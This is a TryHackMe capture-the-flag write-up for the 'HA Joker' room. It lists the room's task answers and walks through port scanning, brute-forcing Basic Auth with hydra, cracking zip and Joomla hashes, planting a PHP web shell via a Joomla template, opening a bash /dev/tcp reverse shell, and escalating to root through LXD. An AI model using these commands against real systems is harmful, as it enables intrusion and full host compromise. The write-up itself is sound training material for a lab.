# 🃏 HA Joker CTF

- **Platform:** TryHackMe
- **URL:** https://tryhackme.com/room/hajokerctf
- **Difficulty:** Medium
- **Category:** Web / Linux / PrivEsc
- **Date Completed:** 2026-02-10
- **Status:** ✅ Complete (100%)
- **Time Taken:** 2.5 hours

---

## 📋 Task Answers

| Task | Question | Answer |
|------|----------|--------|
| 1 | Enumerate services on lab machine. | No answer needed |
| 2 | What version of Apache is it? | `2.4.29` |
| 3 | What port on this machine not need to be authenticated by user and password? | `80` |
| 4 | There is a file on this port that seems to be secret, what is it? | `secret.txt` |
| 5 | There is another file which reveals information of the backend, what is it? | `phpinfo.php` |
| 6 | When reading the secret file, we find a conversation that seems to contain at least two users. What user do you think it is? | `joker` |
| 7 | What port on this machine need to be authenticated by Basic Authentication Mechanism? | `8080` |
| 8 | At this point we have one user and a url that needs to be authenticated, brute force it to get the password, what is that password? | `hannah` |
| 9 | Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory? | `/administrator/` |
| 10 | We need access to the administration of the site in order to get a shell, there is a backup file, What is this file? | `backup.zip` |
| 11 | We have the backup file and now we should look for some information. What is the password? | `hannah` |
| 12 | Some tables must have something like user_table. What is the super duper user? | `admin` |
| 13 | Super Duper User! What is the password? | `abcd1234` |
| 14 | At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session? | `www-data` |
| 15 | This user belongs to a group that differs on your own group, What is this group? | `lxd` |
| 16 | Spawn a tty shell. | No answer needed |
| 17 | The idea here is to mount the root of the OS file system on the container. What is the root flag? | `THM{...}` |

---

## 🔍 Reconnaissance

### Connectivity Check

```bash
ping -c 4 10.10.x.x
Nmap Scan
bash
nmap -sV -sC -p- 10.10.x.x -T4
Results:

text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=Please enter the password.
Key Findings:

Port 22: SSH (OpenSSH 7.6p1)

Port 80: HTTP (Apache 2.4.29) — Open access

Port 8080: HTTP (Apache 2.4.29) — Basic Authentication required

📁 Web Enumeration
Port 80 Enumeration
bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,zip
Findings:

/secret.txt — Contains conversation between Joker and Batman

/phpinfo.php — PHP info disclosure

/css/ — Styles directory

/img/ — Images directory

Secret File Contents
bash
curl http://10.10.x.x/secret.txt
Output:

text
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA!
HA!"
Users identified: joker, batman

💥 Exploitation
Step 1: Brute Force Basic Auth (Port 8080)
bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.x.x -s 8080 http-get /
Output:

text
[8080][http-get] host: 10.10.x.x   login: joker   password: hannah
Credentials: joker:hannah

Step 2: Enumerate Authenticated Site
bash
nikto -h http://10.10.x.x:8080/ -id joker:hannah
Findings:

/administrator/ — Joomla admin panel

/robots.txt

/backup.zip — Backup file

Step 3: Download and Crack Backup
bash
wget --http-user=joker --http-password=hannah http://10.10.x.x:8080/backup.zip
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Zip Password: hannah

Step 4: Extract Database Credentials
bash
unzip backup.zip
cat db/joomladb.sql | grep -i "admin"
Found hash:

text
$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
Step 5: Crack Joomla Admin Hash
bash
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > admin_hash.txt
john admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Admin Password: abcd1234

Credentials: admin:abcd1234

🚀 Gaining Shell Access
Step 1: Login to Joomla Admin
Navigate to: http://10.10.x.x:8080/administrator/

Login with: admin:abcd1234

Step 2: Edit Template for RCE
Go to Extensions → Templates → Templates

Select Beez3 template

Edit error.php

Replace content with:

php
<?php system($_GET['cmd']); ?>
Step 3: Test RCE
bash
curl "http://10.10.x.x:8080/templates/beez3/error.php?cmd=id"
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)

Step 4: Get Reverse Shell
Listener:

bash
nc -lvnp 4444
Payload (URL encoded):

bash
curl "http://10.10.x.x:8080/templates/beez3/error.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.x.x/4444%200>%261'"
Shell obtained as: www-data

Step 5: Stabilize Shell
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
🔐 Privilege Escalation (LXD)
Step 1: Check Group Membership
bash
id
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)

Critical finding: User is in lxd group

Step 2: Build Alpine LXD Image
On attacker machine:

bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
Step 3: Transfer Image to Target
bash
# On target
cd /tmp
wget http://10.10.x.x/alpine-v3.13-x86_64-20210218_0139.tar.gz
Step 4: Import and Exploit LXD
bash
# Import image
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

# Initialize LXD
lxd init
# (Accept defaults)

# Create privileged container
lxc init myimage ignite -c security.privileged=true

# Mount host root filesystem
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start container
lxc start ignite

# Access container
lxc exec ignite /bin/sh
Step 5: Read Root Flag
bash
# Inside container
cd /mnt/root/root
cat root.txt
Root Flag: THM{...}

🛠️ Tools Used
Tool	Purpose
Nmap	Port scanning & service detection
Gobuster	Directory/file enumeration
Hydra	HTTP Basic Auth brute force
Nikto	Web server vulnerability scanning
zip2john	Extract ZIP hash
John the Ripper	Hash cracking
Netcat	Reverse shell listener
LXD	Container-based privilege escalation
🧠 Key Takeaways
Enumeration is everything — The secret.txt file revealed usernames, and proper directory brute-forcing with extensions (-x txt,php) found hidden files.

Don't skip authenticated enumeration — Nikto with credentials revealed the backup file that contained database credentials.

Reuse of passwords — The password hannah worked for Basic Auth, the ZIP file, and was found again in the database.

Joomla template RCE — Editing template files in Joomla admin panel is a classic RCE technique.

LXD privilege escalation — Being in the lxd group is a critical misconfiguration that allows full root access via privileged containers.

Wordlist selection matters — Using the right wordlist and extensions (-x) separates successful enumeration from missed opportunities.

🔗 References
TryHackMe Room: https://tryhackme.com/room/hajokerctf

GTFOBins: https://gtfobins.github.io/

LXD Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd

Joomla RCE Techniques: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

⚠️ Disclaimer
These writeups are for educational purposes only. All techniques were performed in authorized TryHackMe labs. Never use these methods on systems without explicit permission.

⭐ Back to Main README

text

---

## ✅ That's It!
